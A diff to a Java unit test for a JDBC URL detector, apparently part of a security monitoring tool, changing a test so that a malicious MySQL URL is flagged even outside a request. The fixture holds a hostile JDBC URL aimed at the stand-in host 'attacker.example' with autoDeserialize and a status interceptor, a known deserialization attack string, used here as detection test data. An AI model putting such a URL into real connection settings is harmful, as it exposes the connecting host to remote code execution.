@@ -275,14 +275,18 @@ final class JdbcDetectorTest {
     assertAlgorithm(result, "jdbc_mysql_deserialization");
   }
 
+  /** Decided whoever chose the URL, as on the backport lines; request control only raises the confidence. */
   @Test
-  void ignoresMysqlJdbcDeserializationUrlWithoutRequestControl() {
+  void detectsMysqlJdbcDeserializationUrlWithoutRequestControl() {
     String url =
         "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
 
-    var result = JdbcDetector.detectJdbcUrl(url, request());
+    var inRequest = JdbcDetector.detectJdbcUrl(url, request());
+    var background = JdbcDetector.detectJdbcUrl(url, RequestContext.empty());
 
-    assertTrue(result.isEmpty());
+    assertAlgorithm(inRequest, "jdbc_mysql_deserialization");
+    assertEquals(92, inRequest.orElseThrow().confidence());
+    assertAlgorithm(background, "jdbc_mysql_deserialization");
   }
 
   @Test
